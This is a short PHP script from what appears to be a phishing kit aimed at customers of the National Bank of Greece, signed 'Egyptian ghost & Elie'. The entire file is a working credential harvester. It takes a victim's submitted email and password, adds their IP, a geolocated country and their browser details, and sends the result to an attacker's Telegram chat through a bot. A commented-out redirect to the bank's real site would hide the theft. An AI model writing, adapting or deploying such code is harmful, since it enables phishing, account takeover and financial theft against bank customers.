<?php


$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$server = date("D/M/d, Y g:i a"); 

$email = $_POST['spi'];
$password = $_POST['pwd'];


$msg = "
 
 ________Egyptian ghost & Elie_________

id : $email
password : $password
 IP: $ip
 Date: $server
 country : $country
 Browser : $browserAgent
 
 _________Egyptian ghost & Elie__________
 ";

if (empty($email) || empty($password)) {

   
}else {
    
    include "telegram.php";

       // $chat_id="";
    bot('sendMessage',[
'chat_id'=>$chatidd,
'text'=>$msg,
]);
    
 //  header( "Location: thank.html" );
        
// <meta http-equiv="refresh" content="5; URL=https://www.nbg.gr/en">
}
?>

